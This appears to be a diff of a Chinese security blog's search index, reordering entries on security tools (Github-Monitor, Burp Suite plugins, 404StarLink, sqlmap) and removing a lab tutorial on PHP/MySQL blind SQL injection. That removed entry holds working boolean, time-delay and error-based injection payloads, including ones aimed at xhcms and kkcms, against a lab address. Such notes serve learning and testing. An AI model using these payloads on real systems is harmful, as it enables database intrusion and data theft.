+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker.io docker-compose -y</span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/VKSRC/Github-Monitor.git</span><br><span class="line"><span class="built_in">cd</span> Github-Monitor</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>搭建错误！！！需要反复调查</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Github监控</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IIS_shortname_Scanner-master</title>
     <url>/2024/03/15/%E5%B7%A5%E5%85%B7IIS-shortname-Scanner-master/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a><br><br></p>
@@ -2424,6 +2479,61 @@
       </categories>
       <tags>
         <tag>IIS短文件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JS Link Finder, JS Miner, HaE和Unexpected.information</title>
+    <url>/2024/03/11/%E6%8F%92%E4%BB%B6JS%20Link%20Finder,%20JS%20Miner,%20HaE%E5%92%8CUnexpected.information/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/gh0stkey/HaE">HaE</a><br><a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>HaE是一个基于BurpSuite Java插件API开发的辅助型框架式插件，旨在实现对HTTP消息的高亮标记和信息提取。该插件通过自定义正则表达式匹配响应报文或请求报文，并对匹配成功的报文进行标记和提取。</p>
+<p>BurpSuite Extensions是用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，我将它命名为“Unexpected information”，使用它可能会有意外的收获信息。<br><br></p>
+<h2 id="搭建流程："><a href="#搭建流程：" class="headerlink" title="搭建流程："></a>搭建流程：</h2><ol>
+<li><p>Extender -&gt; Options -&gt; Python -&gt; Python Environment -&gt; JAR file<br>E:\one-fox工具箱贺岁内测版\渗透利器\BurpSuite\jython-standalone-2.7.2.jar</p>
+</li>
+<li><p>Extender -&gt; Options -&gt; Python -&gt; Python Environment -&gt; loading modules<br>E:\one-fox工具箱贺岁内测版\Python3.8\Lib\site-packages</p>
+</li>
+<li><p>Extender -&gt; BApp Store -&gt; JS Link Finder，JS Miner</p>
+</li>
+<li><p>Extender -&gt; Extensions -&gt; Add<br>E:\one-fox工具箱贺岁内测版\HaE-2.4.6-J8.jar</p>
+</li>
+<li><p>Extender -&gt; Extensions -&gt; Add<br>E:\one-fox工具箱贺岁内测版<br>Unexpected.information.v2.3.1.jar</p>
+</li>
+<li><p>C:\Users.config\HaE -&gt; 配置Config.yml</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>JS敏感信息</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>404星链项目</title>
+    <url>/2024/03/12/%E9%A1%B9%E7%9B%AE404%E6%98%9F%E9%93%BE/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/knownsec/404StarLink">404StarLink</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>「404星链计划」是知道创宇 404 实验室于 2020 年 8 月开始的计划，主要目的是改善安全圈内工具庞杂、水平层次不齐、开源无人维护的多种问题，促进安全开源社区的发展；通过这种方式将不同安全领域研究人员与开源项目链接起来。</p>
+<p>星链计划将不断地收集优秀的安全开源项目，对收录的项目提供技术支持，持续跟踪和展示项目的更新和动态，并建立了星链计划社区，社区用户可以通过星链展示板块探索自己感兴趣的项目，同时还可以在社区内快速为开源作者反馈问题。以此方式帮助开源项目成长，促进安全社区发展。</p>
+]]></content>
+      <categories>
+        <category>项目</category>
+      </categories>
+      <tags>
+        <tag>项目集合</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sqlmap</title>
+    <url>/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/</url>
+    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/sqlmapproject/sqlmap">Sqlmap</a><br><br></p>
+<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>sqlmap 是一个开源渗透测试工具，可以自动执行检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 它配备了强大的检测引擎、最终渗透测试仪的许多利基功能以及广泛的开关，包括数据库指纹、从数据库获取数据、访问底层文件系统以及通过输出在操作系统上执行命令。 带外连接。<br><br></p>
+<h2 id="使用流程："><a href="#使用流程：" class="headerlink" title="使用流程："></a>使用流程：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2468,81 +2578,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Sqlmap</title>
-    <url>/2024/03/15/%E5%B7%A5%E5%85%B7sqlmap-master/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/sqlmapproject/sqlmap">Sqlmap</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>sqlmap 是一个开源渗透测试工具，可以自动执行检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 它配备了强大的检测引擎、最终渗透测试仪的许多利基功能以及广泛的开关，包括数据库指纹、从数据库获取数据、访问底层文件系统以及通过输出在操作系统上执行命令。 带外连接。<br><br></p>
-<h2 id="使用流程："><a href="#使用流程：" class="headerlink" title="使用流程："></a>使用流程：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -h</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Github-Monitor</title>
-    <url>/2024/03/11/%E5%B7%A5%E5%85%B7Github-Monitor/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>GITHUB MONITOR 是vipkid安全研发团队打造的用于监控Github代码仓库的系统。通过该系统可以及时发现企业内部代码泄露、从而降低由于代码泄露导致的一系列安全风险。用户仅需通过简单的任务配置，即可在分钟级发现代码泄露的情况。项目后端使用 django-rest-framework 开发，前端使用 react 和 antd-pro 开发。<br><br></p>
-<h2 id="搭建流程："><a href="#搭建流程：" class="headerlink" title="搭建流程："></a>搭建流程：</h2><ol>
-<li><p>阿里云购买Ubuntu 18.04服务器</p>
-</li>
-<li><p>连接服务器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker.io docker-compose -y</span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/VKSRC/Github-Monitor.git</span><br><span class="line"><span class="built_in">cd</span> Github-Monitor</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>搭建错误！！！需要反复调查</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Github监控</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>404星链项目</title>
-    <url>/2024/03/12/%E9%A1%B9%E7%9B%AE404%E6%98%9F%E9%93%BE/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/knownsec/404StarLink">404StarLink</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>「404星链计划」是知道创宇 404 实验室于 2020 年 8 月开始的计划，主要目的是改善安全圈内工具庞杂、水平层次不齐、开源无人维护的多种问题，促进安全开源社区的发展；通过这种方式将不同安全领域研究人员与开源项目链接起来。</p>
-<p>星链计划将不断地收集优秀的安全开源项目，对收录的项目提供技术支持，持续跟踪和展示项目的更新和动态，并建立了星链计划社区，社区用户可以通过星链展示板块探索自己感兴趣的项目，同时还可以在社区内快速为开源作者反馈问题。以此方式帮助开源项目成长，促进安全社区发展。</p>
-]]></content>
-      <categories>
-        <category>项目</category>
-      </categories>
-      <tags>
-        <tag>项目集合</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JS Link Finder, JS Miner, HaE和Unexpected.information</title>
-    <url>/2024/03/11/%E6%8F%92%E4%BB%B6JS%20Link%20Finder,%20JS%20Miner,%20HaE%E5%92%8CUnexpected.information/</url>
-    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/gh0stkey/HaE">HaE</a><br><a href="https://github.com/ScriptKid-Beta/Unexpected_information">Unexpected_information</a><br><br></p>
-<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p>HaE是一个基于BurpSuite Java插件API开发的辅助型框架式插件，旨在实现对HTTP消息的高亮标记和信息提取。该插件通过自定义正则表达式匹配响应报文或请求报文，并对匹配成功的报文进行标记和提取。</p>
-<p>BurpSuite Extensions是用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，我将它命名为“Unexpected information”，使用它可能会有意外的收获信息。<br><br></p>
-<h2 id="搭建流程："><a href="#搭建流程：" class="headerlink" title="搭建流程："></a>搭建流程：</h2><ol>
-<li><p>Extender -&gt; Options -&gt; Python -&gt; Python Environment -&gt; JAR file<br>E:\one-fox工具箱贺岁内测版\渗透利器\BurpSuite\jython-standalone-2.7.2.jar</p>
-</li>
-<li><p>Extender -&gt; Options -&gt; Python -&gt; Python Environment -&gt; loading modules<br>E:\one-fox工具箱贺岁内测版\Python3.8\Lib\site-packages</p>
-</li>
-<li><p>Extender -&gt; BApp Store -&gt; JS Link Finder，JS Miner</p>
-</li>
-<li><p>Extender -&gt; Extensions -&gt; Add<br>E:\one-fox工具箱贺岁内测版\HaE-2.4.6-J8.jar</p>
-</li>
-<li><p>Extender -&gt; Extensions -&gt; Add<br>E:\one-fox工具箱贺岁内测版<br>Unexpected.information.v2.3.1.jar</p>
-</li>
-<li><p>C:\Users.config\HaE -&gt; 配置Config.yml</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>JS敏感信息</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>红蓝队优秀工具项目集合</title>
     <url>/2024/03/11/%E9%A1%B9%E7%9B%AE%E7%BA%A2%E8%93%9D%E9%98%9F%E4%BC%98%E7%A7%80%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">All-Defense-Tool</a><br><br></p>
@@ -2554,40 +2589,5 @@
       <tags>
         <tag>项目集合</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</title>
-    <url>/2024/03/17/Web%E6%94%BB%E9%98%B24/</url>
-    <content><![CDATA[<h2 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h2><p>1、功能：数据查询<br>查询：SELECT * FROM news where id&#x3D;$id</p>
-<p>2、功能：新增用户，添加新闻等<br>增加：INSERT INTO news (列名) VALUES (数据)</p>
-<p>3、功能：删除用户，删除新闻等<br>删除：DELETE FROM news WHERE id&#x3D;$id</p>
-<p>4、功能：修改用户，修改文章等<br>修改：UPDATE news SET id&#x3D;$id</p>
-<h2 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h2><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况</p>
-<p>我们可以知道盲注分为以下三类：<br>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p>
-<p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p>
-<p>3、基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue</p>
-<p>延迟（注意and有时候执行不了改成or）：<br>and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br><a href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br>如果数据库名demo01第一位等于d，所以延时5秒</p>
-<p>and if(length(database())&#x3D;6,sleep(5),sleep(0));<br><a href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(length(database())&#x3D;6,sleep(5),sleep(0));<br>如果数据库名demo01位数等于6，所以延时5秒</p>
-<p>布尔：<br>and length(database())&#x3D;7;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and length(database())&#x3D;7;<br>查询数据库demo01长度，是6位，等于7就没回显</p>
-<p>and left(database(),1)&#x3D;’p’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
-<p>and left(database(),2)&#x3D;’pi’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),2)&#x3D;’pi’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前两位等于de，所以没回显</p>
-<p>and substr(database(),1,1)&#x3D;’p’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),1,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第一位等于d，所以没回显</p>
-<p>and substr(database(),2,1)&#x3D;’i’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),2,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第二位等于e，所以没有数据</p>
-<p>and ord(left(database(),1))&#x3D;112;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and ord(left(database(),1))&#x3D;112;<br>适用的是ASCII码，防止引号过滤，11为p的ASCII码，查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
-<p>报错：<br>and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>updatexml 会触发一个 SQL 错误，从而报出错误</p>
-<p>and extractvalue(1, concat(0x5c, (select version())));<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and extractvalue(1, concat(0x5c, (select version())));<br>extractvalue 会触发一个 SQL 错误，从而报出错误</p>
-<p>更多：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
-<p>参考：<br>like ‘ro%’            #判断ro或ro…是否成立<br>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等<br>if(条件,5,0)          #条件成立 返回5 反之 返回0<br>sleep(5)              #SQL语句延时执行5秒<br>mid(a,b,c)            #从位置b开始，截取a字符串的c位<br>substr(a,b,c)         #从位置b开始，截取字符串a的c长度<br>left(database(),1)，database() #left(a,b)从左侧截取a的前b位<br>length(database())&#x3D;8  #判断数据库database()名的长度<br>ord&#x3D;ascii ascii(x)&#x3D;97 #判断x的ascii码是否等于97</p>
-<h2 id="PHP-MYSQL-注入条件-数据回显-错误处理"><a href="#PHP-MYSQL-注入条件-数据回显-错误处理" class="headerlink" title="PHP-MYSQL-注入条件-数据回显&amp;错误处理"></a>PHP-MYSQL-注入条件-数据回显&amp;错误处理</h2><p>PHP开发项目-输出结果&amp;开启报错<br>基于延时：都不需要，没有报错和回显都能进行，适用于增删改查里面的增删改<br>and if(1&#x3D;1,sleep(5),0)</p>
-<p>基于布尔：数据库输出判断标准，需要数据回显才能用，仅适用于增删改查里面的查<br>and length(database())&#x3D;6</p>
-<p>基于报错：数据库报错处理判断标准，适用于增删改查里面的增（前提是有报错代码的漏洞例如：or die(mysqli_error($con))）<br>and updatexml(1,concat(0x7e,(SELECT version(),0x7e),1)</p>
-<h2 id="PHP-MYSQL-CMS案例-插入报错-删除延时"><a href="#PHP-MYSQL-CMS案例-插入报错-删除延时" class="headerlink" title="PHP-MYSQL-CMS案例-插入报错&amp;删除延时"></a>PHP-MYSQL-CMS案例-插入报错&amp;删除延时</h2><p>1、xhcms-insert报错，注入发表评论昵称处<br>‘ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and ‘</p>
-<p>2、kkcms-delete延时，先登录后台<br><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(1&#x3D;1,sleep(5),0)</p>
-<p><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(length(database())&#x3D;6,sleep(5),sleep(0))</p>
-<p><a href="http://10.0.1.139:82/admin/cms_usergroup.php?del=4">http://10.0.1.139:82/admin/cms_usergroup.php?del=4</a> or if(ord(left(database(),1))&#x3D;107,sleep(5),sleep(0))</p>
-]]></content>
-      <categories>
-        <category>Web攻防</category>
-      </categories>
   </entry>
 </search>
